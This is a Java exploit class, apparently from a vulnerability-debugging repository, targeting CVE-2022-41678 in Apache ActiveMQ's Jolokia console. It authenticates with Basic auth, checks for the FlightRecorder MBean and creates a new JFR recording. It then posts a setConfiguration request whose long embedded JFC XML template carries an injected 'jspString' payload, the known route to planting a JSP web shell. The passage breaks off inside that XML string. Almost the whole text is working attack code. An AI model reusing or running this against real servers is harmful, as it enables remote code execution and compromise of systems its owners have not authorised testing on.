package cve;

import com.alibaba.fastjson.JSONObject;
import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;

import java.io.IOException;
import java.util.Base64;
import java.util.HashMap;

public class CVE_2022_41678 {

    public static String getBase64String(String username,String password) {
        String fmt = username + ":" + password;
        String s = Base64.getEncoder().encodeToString(fmt.getBytes());

        return s;
    }

    public static boolean checkExistFlightRecorder(String url,String authBase64) throws IOException {
        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpGet httpGet = new HttpGet(url);
        httpGet.setHeader("Authorization","Basic " + authBase64);
        httpGet.setHeader("Origin","http://127.0.0.1:8161/");
        String response = httpRequest.sendGet(httpGet);

        return response.indexOf("FlightRecorder") > 1;

    }

    public static HashMap<String, Integer> createNewRecording(String url, String authBase64) throws IOException {

        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.setHeader("Authorization","Basic " + authBase64);
        httpPost.setHeader("Origin","http://127.0.0.1:8161/");
        String body = "{\n" +
                " \"type\": \"EXEC\",\n" +
                " \"mbean\": \"jdk.management.jfr:type=FlightRecorder\",\n" +
                " \"operation\": \"newRecording\",\n" +
                " \"arguments\": []\n" +
                "}";
        String response = httpRequest.sendStringPost(httpPost, body);
        JSONObject json = (JSONObject) JSONObject.parse(response);

        HashMap<String, Integer> map = new HashMap<>();
        map.put("value",(int) json.get("value"));
        map.put("status",(int) json.get("status"));

        return map;
    }


    public static boolean setConfiguration(String url, String authBase64, int value, String jspString) throws IOException {

        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.setHeader("Authorization","Basic " + authBase64);
        httpPost.setHeader("Origin","http://127.0.0.1:8161/");
        String configXml = "<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!--     Recommended way to edit .jfc files is to use Java Mission Control,     see Window -> Flight Recorder Template Manager.--><configuration version=\\\"2.0\\\" label=\\\"Continuous\\\" description=\\\"Low overhead configuration safe for continuous use in production environments, typically less than 1 % overhead.\\\" provider=\\\"Oracle\\\">    <event name=\\\"jdk.ThreadAllocationStatistics\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">everyChunk " + jspString + "</setting>    </event>    <event name=\\\"jdk.ClassLoadingStatistics\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">1000 ms</setting>    </event>    <event name=\\\"jdk.ClassLoaderStatistics\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">everyChunk</setting>    </event>    <event name=\\\"jdk.JavaThreadStatistics\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">1000 ms</setting>    </event>    <event name=\\\"jdk.ThreadStart\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>    </event>    <event name=\\\"jdk.ThreadEnd\\\">      <setting name=\\\"enabled\\\">true</setting>    </event>    <event name=\\\"jdk.ThreadSleep\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>      <setting name=\\\"threshold\\\" control=\\\"synchronization-threshold\\\">20 ms</setting>    </event>    <event name=\\\"jdk.ThreadPark\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>      <setting name=\\\"threshold\\\" control=\\\"synchronization-threshold\\\">20 ms</setting>    </event>    <event name=\\\"jdk.JavaMonitorEnter\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>      <setting name=\\\"threshold\\\" control=\\\"synchronization-threshold\\\">20 ms</setting>    </event>    <event name=\\\"jdk.JavaMonitorWait\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>      <setting name=\\\"threshold\\\" control=\\\"synchronization-threshold\\\">20 ms</setting>    </event>    <event name=\\\"jdk.JavaMonitorInflate\\\">      <setting name=\\\"enabled\\\">false</setting>      <setting name=\\\"stackTrace\\\">true</setting>      <setting name=\\\"threshold\\\" control=\\\"synchronization-threshold\\\">20 ms</setting>    </event>    <event name=\\\"jdk.BiasedLockRevocation\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>      <setting name=\\\"threshold\\\">0 ms</setting>    </event>    <event name=\\\"jdk.BiasedLockSelfRevocation\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>      <setting name=\\\"threshold\\\">0 ms</setting>    </event>    <event name=\\\"jdk.BiasedLockClassRevocation\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>      <setting name=\\\"threshold\\\">0 ms</setting>    </event>    <event name=\\\"jdk.ReservedStackActivation\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>    </event>    <event name=\\\"jdk.ClassLoad\\\">      <setting name=\\\"enabled\\\" control=\\\"class-loading-enabled\\\">false</setting>      <setting name=\\\"stackTrace\\\">true</setting>      <setting name=\\\"threshold\\\">0 ms</setting>    </event>    <event name=\\\"jdk.ClassDefine\\\">      <setting name=\\\"enabled\\\" control=\\\"class-loading-enabled\\\">false</setting>      <setting name=\\\"stackTrace\\\">true</setting>    </event>    <event name=\\\"jdk.ClassUnload\\\">      <setting name=\\\"enabled\\\" control=\\\"class-loading-enabled\\\">false</setting>    </event>    <event name=\\\"jdk.JVMInformation\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.InitialSystemProperty\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.ExecutionSample\\\">      <setting name=\\\"enabled\\\" control=\\\"method-sampling-enabled\\\">true</setting>      <setting name=\\\"period\\\" control=\\\"method-sampling-interval\\\">20 ms</setting>    </event>    <event name=\\\"jdk.NativeMethodSample\\\">      <setting name=\\\"enabled\\\" control=\\\"method-sampling-enabled\\\">true</setting>      <setting name=\\\"period\\\" control=\\\"method-sampling-interval\\\">20 ms</setting>    </event>    <event name=\\\"jdk.SafepointBegin\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"threshold\\\">10 ms</setting>    </event>    <event name=\\\"jdk.SafepointStateSynchronization\\\">      <setting name=\\\"enabled\\\">false</setting>      <setting name=\\\"threshold\\\">10 ms</setting>    </event>    <event name=\\\"jdk.SafepointWaitBlocked\\\">      <setting name=\\\"enabled\\\">false</setting>      <setting name=\\\"threshold\\\">10 ms</setting>    </event>    <event name=\\\"jdk.SafepointCleanup\\\">      <setting name=\\\"enabled\\\">false</setting>      <setting name=\\\"threshold\\\">10 ms</setting>    </event>    <event name=\\\"jdk.SafepointCleanupTask\\\">      <setting name=\\\"enabled\\\">false</setting>      <setting name=\\\"threshold\\\">10 ms</setting>    </event>    <event name=\\\"jdk.SafepointEnd\\\">      <setting name=\\\"enabled\\\">false</setting>      <setting name=\\\"threshold\\\">10 ms</setting>    </event>    <event name=\\\"jdk.ExecuteVMOperation\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"threshold\\\">10 ms</setting>    </event>    <event name=\\\"jdk.Shutdown\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>    </event>    <event name=\\\"jdk.ThreadDump\\\">      <setting name=\\\"enabled\\\" control=\\\"thread-dump-enabled\\\">true</setting>      <setting name=\\\"period\\\" control=\\\"thread-dump-interval\\\">everyChunk</setting>    </event>    <event name=\\\"jdk.IntFlag\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.UnsignedIntFlag\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.LongFlag\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.UnsignedLongFlag\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.DoubleFlag\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.BooleanFlag\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.StringFlag\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.IntFlagChanged\\\">      <setting name=\\\"enabled\\\">true</setting>    </event>    <event name=\\\"jdk.UnsignedIntFlagChanged\\\">      <setting name=\\\"enabled\\\">true</setting>    </event>    <event name=\\\"jdk.LongFlagChanged\\\">      <setting name=\\\"enabled\\\">true</setting>    </event>    <event name=\\\"jdk.UnsignedLongFlagChanged\\\">      <setting name=\\\"enabled\\\">true</setting>    </event>    <event name=\\\"jdk.DoubleFlagChanged\\\">      <setting name=\\\"enabled\\\">true</setting>    </event>    <event name=\\\"jdk.BooleanFlagChanged\\\">      <setting name=\\\"enabled\\\">true</setting>    </event>    <event name=\\\"jdk.StringFlagChanged\\\">      <setting name=\\\"enabled\\\">true</setting>    </event>    <event name=\\\"jdk.ObjectCount\\\">      <setting name=\\\"enabled\\\" control=\\\"memory-profiling-enabled-all\\\">false</setting>      <setting name=\\\"period\\\">everyChunk</setting>    </event>    <event name=\\\"jdk.GCConfiguration\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>      <setting name=\\\"period\\\">everyChunk</setting>    </event>    <event name=\\\"jdk.GCHeapConfiguration\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.YoungGenerationConfiguration\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.GCTLABConfiguration\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.GCSurvivorConfiguration\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.ObjectCountAfterGC\\\">      <setting name=\\\"enabled\\\">false</setting>    </event>    <event name=\\\"jdk.GCHeapSummary\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.PSHeapSummary\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.G1HeapSummary\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.MetaspaceSummary\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.MetaspaceGCThreshold\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.MetaspaceAllocationFailure\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>    </event>    <event name=\\\"jdk.MetaspaceOOM\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>    </event>    <event name=\\\"jdk.MetaspaceChunkFreeListSummary\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.GarbageCollection\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>      <setting name=\\\"threshold\\\">0 ms</setting>    </event>    <event name=\\\"jdk.ParallelOldGarbageCollection\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>      <setting name=\\\"threshold\\\">0 ms</setting>    </event>    <event name=\\\"jdk.YoungGarbageCollection\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>      <setting name=\\\"threshold\\\">0 ms</setting>    </event>    <event name=\\\"jdk.OldGarbageCollection\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>      <setting name=\\\"threshold\\\">0 ms</setting>    </event>    <event name=\\\"jdk.G1GarbageCollection\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>      <setting name=\\\"threshold\\\">0 ms</setting>    </event>    <event name=\\\"jdk.GCPhasePause\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>      <setting name=\\\"threshold\\\">0 ms</setting>    </event>    <event name=\\\"jdk.GCPhasePauseLevel1\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>      <setting name=\\\"threshold\\\">0 ms</setting>    </event>    <event name=\\\"jdk.GCPhasePauseLevel2\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>      <setting name=\\\"threshold\\\">0 ms</setting>    </event>    <event name=\\\"jdk.GCPhasePauseLevel3\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-all\\\">false</setting>      <setting name=\\\"threshold\\\">0 ms</setting>    </event>    <event name=\\\"jdk.GCPhasePauseLevel4\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-all\\\">false</setting>      <setting name=\\\"threshold\\\">0 ms</setting>    </event>    <event name=\\\"jdk.GCPhaseConcurrent\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-all\\\">true</setting>      <setting name=\\\"threshold\\\">0 ms</setting>    </event>    <event name=\\\"jdk.GCReferenceStatistics\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.PromotionFailed\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.EvacuationFailed\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.EvacuationInformation\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.G1MMU\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.G1EvacuationYoungStatistics\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.G1EvacuationOldStatistics\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.G1BasicIHOP\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.G1AdaptiveIHOP\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.PromoteObjectInNewPLAB\\\">      <setting name=\\\"enabled\\\" control=\\\"memory-profiling-enabled-medium\\\">false</setting>    </event>    <event name=\\\"jdk.PromoteObjectOutsidePLAB\\\">      <setting name=\\\"enabled\\\" control=\\\"memory-profiling-enabled-medium\\\">false</setting>    </event>    <event name=\\\"jdk.ConcurrentModeFailure\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.AllocationRequiringGC\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-all\\\">false</setting>      <setting name=\\\"stackTrace\\\">true</setting>    </event>    <event name=\\\"jdk.TenuringDistribution\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-normal\\\">true</setting>    </event>    <event name=\\\"jdk.G1HeapRegionInformation\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-all\\\">false</setting>      <setting name=\\\"period\\\">everyChunk</setting>    </event>    <event name=\\\"jdk.G1HeapRegionTypeChange\\\">      <setting name=\\\"enabled\\\" control=\\\"gc-enabled-all\\\">false</setting>    </event>    <event name=\\\"jdk.OldObjectSample\\\">      <setting name=\\\"enabled\\\" control=\\\"memory-leak-detection-enabled\\\">true</setting>      <setting name=\\\"stackTrace\\\" control=\\\"memory-leak-detection-stack-trace\\\">false</setting>      <setting name=\\\"cutoff\\\" control=\\\"memory-leak-detection-cutoff\\\">0 ns</setting>    </event>    <event name=\\\"jdk.CompilerConfiguration\\\">      <setting name=\\\"enabled\\\" control=\\\"compiler-enabled\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.CompilerStatistics\\\">      <setting name=\\\"enabled\\\" control=\\\"compiler-enabled\\\">true</setting>      <setting name=\\\"period\\\">1000 ms</setting>    </event>    <event name=\\\"jdk.Compilation\\\">      <setting name=\\\"enabled\\\" control=\\\"compiler-enabled\\\">true</setting>      <setting name=\\\"threshold\\\" control=\\\"compiler-compilation-threshold\\\">1000 ms</setting>    </event>    <event name=\\\"jdk.CompilerPhase\\\">      <setting name=\\\"enabled\\\" control=\\\"compiler-enabled\\\">true</setting>      <setting name=\\\"threshold\\\" control=\\\"compiler-phase-threshold\\\">60 s</setting>    </event>    <event name=\\\"jdk.CompilationFailure\\\">      <setting name=\\\"enabled\\\" control=\\\"compiler-enabled-failure\\\">false</setting>    </event>    <event name=\\\"jdk.CompilerInlining\\\">      <setting name=\\\"enabled\\\" control=\\\"compiler-enabled-failure\\\">false</setting>    </event>    <event name=\\\"jdk.CodeSweeperConfiguration\\\">      <setting name=\\\"enabled\\\" control=\\\"compiler-enabled\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.CodeSweeperStatistics\\\">      <setting name=\\\"enabled\\\" control=\\\"compiler-enabled\\\">true</setting>      <setting name=\\\"period\\\">everyChunk</setting>    </event>    <event name=\\\"jdk.SweepCodeCache\\\">      <setting name=\\\"enabled\\\" control=\\\"compiler-enabled\\\">true</setting>      <setting name=\\\"threshold\\\" control=\\\"compiler-sweeper-threshold\\\">100 ms</setting>    </event>    <event name=\\\"jdk.CodeCacheConfiguration\\\">      <setting name=\\\"enabled\\\" control=\\\"compiler-enabled\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.CodeCacheStatistics\\\">      <setting name=\\\"enabled\\\" control=\\\"compiler-enabled\\\">true</setting>      <setting name=\\\"period\\\">everyChunk</setting>    </event>    <event name=\\\"jdk.CodeCacheFull\\\">      <setting name=\\\"enabled\\\" control=\\\"compiler-enabled\\\">true</setting>    </event>    <event name=\\\"jdk.OSInformation\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.CPUInformation\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.ThreadContextSwitchRate\\\">      <setting name=\\\"enabled\\\" control=\\\"compiler-enabled\\\">true</setting>      <setting name=\\\"period\\\">10 s</setting>    </event>    <event name=\\\"jdk.CPULoad\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">1000 ms</setting>    </event>    <event name=\\\"jdk.ThreadCPULoad\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">10 s</setting>    </event>    <event name=\\\"jdk.CPUTimeStampCounter\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.SystemProcess\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">endChunk</setting>    </event>    <event name=\\\"jdk.NetworkUtilization\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">5 s</setting>    </event>    <event name=\\\"jdk.InitialEnvironmentVariable\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">beginChunk</setting>    </event>    <event name=\\\"jdk.PhysicalMemory\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">everyChunk</setting>    </event>    <event name=\\\"jdk.ObjectAllocationInNewTLAB\\\">      <setting name=\\\"enabled\\\" control=\\\"memory-profiling-enabled-medium\\\">false</setting>      <setting name=\\\"stackTrace\\\">true</setting>    </event>    <event name=\\\"jdk.ObjectAllocationOutsideTLAB\\\">      <setting name=\\\"enabled\\\" control=\\\"memory-profiling-enabled-medium\\\">false</setting>      <setting name=\\\"stackTrace\\\">true</setting>    </event>    <event name=\\\"jdk.NativeLibrary\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">everyChunk</setting>    </event>    <event name=\\\"jdk.ModuleRequire\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">endChunk</setting>    </event>    <event name=\\\"jdk.ModuleExport\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">endChunk</setting>    </event>    <event name=\\\"jdk.FileForce\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>      <setting name=\\\"threshold\\\" control=\\\"file-io-threshold\\\">20 ms</setting>    </event>    <event name=\\\"jdk.FileRead\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>      <setting name=\\\"threshold\\\" control=\\\"file-io-threshold\\\">20 ms</setting>    </event>    <event name=\\\"jdk.FileWrite\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>      <setting name=\\\"threshold\\\" control=\\\"file-io-threshold\\\">20 ms</setting>    </event>    <event name=\\\"jdk.SocketRead\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>      <setting name=\\\"threshold\\\" control=\\\"socket-io-threshold\\\">20 ms</setting>    </event>    <event name=\\\"jdk.SocketWrite\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>      <setting name=\\\"threshold\\\" control=\\\"socket-io-threshold\\\">20 ms</setting>    </event>    <event name=\\\"jdk.SecurityPropertyModification\\\">       <setting name=\\\"enabled\\\">false</setting>       <setting name=\\\"stackTrace\\\">true</setting>    </event>    <event name=\\\"jdk.TLSHandshake\\\">      <setting name=\\\"enabled\\\">false</setting>      <setting name=\\\"stackTrace\\\">true</setting>    </event>    <event name=\\\"jdk.X509Validation\\\">       <setting name=\\\"enabled\\\">false</setting>       <setting name=\\\"stackTrace\\\">true</setting>    </event>    <event name=\\\"jdk.X509Certificate\\\">       <setting name=\\\"enabled\\\">false</setting>       <setting name=\\\"stackTrace\\\">true</setting>    </event>    <event name=\\\"jdk.JavaExceptionThrow\\\">      <setting name=\\\"enabled\\\" control=\\\"enable-exceptions\\\">false</setting>      <setting name=\\\"stackTrace\\\">true</setting>    </event>    <event name=\\\"jdk.JavaErrorThrow\\\">      <setting name=\\\"enabled\\\" control=\\\"enable-errors\\\">true</setting>      <setting name=\\\"stackTrace\\\">true</setting>    </event>    <event name=\\\"jdk.ExceptionStatistics\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"period\\\">1000 ms</setting>    </event>    <event name=\\\"jdk.ActiveRecording\\\">      <setting name=\\\"enabled\\\">true</setting>    </event>    <event name=\\\"jdk.ActiveSetting\\\">      <setting name=\\\"enabled\\\">true</setting>    </event>    <event name=\\\"jdk.DataLoss\\\">      <setting name=\\\"enabled\\\">true</setting>    </event>    <event name=\\\"jdk.DumpReason\\\">      <setting name=\\\"enabled\\\">true</setting>    </event>    <event name=\\\"jdk.ZPageAllocation\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"threshold\\\">10 ms</setting>    </event>    <event name=\\\"jdk.ZThreadPhase\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"threshold\\\">0 ms</setting>    </event>    <event name=\\\"jdk.ZStatisticsCounter\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"threshold\\\">10 ms</setting>    </event>    <event name=\\\"jdk.ZStatisticsSampler\\\">      <setting name=\\\"enabled\\\">true</setting>      <setting name=\\\"threshold\\\">10 ms</setting>    </event>    <!--        Contents of the control element is not read by the JVM, it's used        by Java Mission Control to change settings that carry the control attribute.    -->    <control>      <selection name=\\\"gc-level\\\" default=\\\"detailed\\\" label=\\\"Garbage Collector\\\">        <option label=\\\"Off\\\" name=\\\"off\\\">off</option>        <option label=\\\"Normal\\\" name=\\\"detailed\\\">normal</option>        <option label=\\\"All\\\" name=\\\"all\\\">all</option>      </selection>      <condition name=\\\"gc-enabled-normal\\\" true=\\\"true\\\" false=\\\"false\\\">        <or>          <test name=\\\"gc-level\\\" operator=\\\"equal\\\" value=\\\"normal\\\"/>          <test name=\\\"gc-level\\\" operator=\\\"equal\\\" value=\\\"all\\\"/>        </or>      </condition>      <condition name=\\\"gc-enabled-all\\\" true=\\\"true\\\" false=\\\"false\\\">        <test name=\\\"gc-level\\\" operator=\\\"equal\\\" value=\\\"all\\\"/>      </condition>      <selection name=\\\"memory-profiling\\\" default=\\\"off\\\" label=\\\"Memory Profiling\\\">        <option label=\\\"Off\\\" name=\\\"off\\\">off</option>        <option label=\\\"Object Allocation and Promotion\\\" name=\\\"medium\\\">medium</option>        <option label=\\\"All, including Heap Statistics (May cause long full GCs)\\\" name=\\\"all\\\">all</option>      </selection>      <condition name=\\\"memory-profiling-enabled-medium\\\" true=\\\"true\\\" false=\\\"false\\\">        <or>          <test name=\\\"memory-profiling\\\" operator=\\\"equal\\\" value=\\\"medium\\\"/>          <test name=\\\"memory-profiling\\\" operator=\\\"equal\\\" value=\\\"all\\\"/>        </or>      </condition>      <condition name=\\\"memory-profiling-enabled-all\\\" true=\\\"true\\\" false=\\\"false\\\">        <test name=\\\"memory-profiling\\\" operator=\\\"equal\\\" value=\\\"all\\\"/>      </condition>      <selection name=\\\"compiler-level\\\" default=\\\"normal\\\" label=\\\"Compiler\\\">        <option label=\\\"Off\\\" name=\\\"off\\\">off</option>        <option label=\\\"Normal\\\" name=\\\"normal\\\">normal</option>        <option label=\\\"Detailed\\\" name=\\\"detailed\\\">detailed</option>        <option label=\\\"All\\\" name=\\\"all\\\">all</option>      </selection>      <condition name=\\\"compiler-enabled\\\" true=\\\"false\\\" false=\\\"true\\\">        <test name=\\\"compiler-level\\\" operator=\\\"equal\\\" value=\\\"off\\\"/>      </condition>      <condition name=\\\"compiler-enabled-failure\\\" true=\\\"true\\\" false=\\\"false\\\">        <or>          <test name=\\\"compiler-level\\\" operator=\\\"equal\\\" value=\\\"detailed\\\"/>          <test name=\\\"compiler-level\\\" operator=\\\"equal\\\" value=\\\"all\\\"/>        </or>      </condition>      <condition name=\\\"compiler-sweeper-threshold\\\" true=\\\"0 ms\\\" false=\\\"100 ms\\\">        <test name=\\\"compiler-level\\\" operator=\\\"equal\\\" value=\\\"all\\\"/>      </condition>      <condition name=\\\"compiler-compilation-threshold\\\" true=\\\"1000 ms\\\">        <test name=\\\"compiler-level\\\" operator=\\\"equal\\\" value=\\\"normal\\\"/>      </condition>      <condition name=\\\"compiler-compilation-threshold\\\" true=\\\"100 ms\\\">        <test name=\\\"compiler-level\\\" operator=\\\"equal\\\" value=\\\"detailed\\\"/>      </condition>      <condition name=\\\"compiler-compilation-threshold\\\" true=\\\"0 ms\\\">        <test name=\\\"compiler-level\\\" operator=\\\"equal\\\" value=\\\"all\\\"/>      </condition>      <condition name=\\\"compiler-phase-threshold\\\" true=\\\"60 s\\\">        <test name=\\\"compiler-level\\\" operator=\\\"equal\\\" value=\\\"normal\\\"/>      </condition>      <condition name=\\\"compiler-phase-threshold\\\" true=\\\"10 s\\\">        <test name=\\\"compiler-level\\\" operator=\\\"equal\\\" value=\\\"detailed\\\"/>      </condition>      <condition name=\\\"compiler-phase-threshold\\\" true=\\\"0 s\\\">        <test name=\\\"compiler-level\\\" operator=\\\"equal\\\" value=\\\"all\\\"/>      </condition>      <selection name=\\\"method-sampling-interval\\\" default=\\\"normal\\\" label=\\\"Method Sampling\\\">        <option label=\\\"Off\\\" name=\\\"off\\\">999 d</option>        <option label=\\\"Normal\\\" name=\\\"normal\\\">20 ms</option>        <option label=\\\"Maximum\\\" name=\\\"maximum\\\">10 ms</option>      </selection>      <condition name=\\\"method-sampling-enabled\\\" true=\\\"false\\\" false=\\\"true\\\">        <test name=\\\"method-sampling-interval\\\" operator=\\\"equal\\\" value=\\\"999 d\\\"/>      </condition>      <selection name=\\\"thread-dump-interval\\\" default=\\\"normal\\\" label=\\\"Thread Dump\\\">        <option label=\\\"Off\\\" name=\\\"off\\\">999 d</option>        <option label=\\\"At least Once\\\" name=\\\"normal\\\">everyChunk</option>        <option label=\\\"Every 60 s\\\" name=\\\"everyMinute\\\">60 s</option>        <option label=\\\"Every 10 s\\\" name=\\\"everyTenSecond\\\">10 s</option>        <option label=\\\"Every 1 s\\\" name=\\\"everySecond\\\">1 s</option>      </selection>      <condition name=\\\"thread-dump-enabled\\\" true=\\\"false\\\" false=\\\"true\\\">        <test name=\\\"thread-dump-interval\\\" operator=\\\"equal\\\" value=\\\"999 d\\\"/>      </condition>      <selection name=\\\"exception-level\\\" default=\\\"errors\\\" label=\\\"Exceptions\\\">        <option label=\\\"Off\\\" 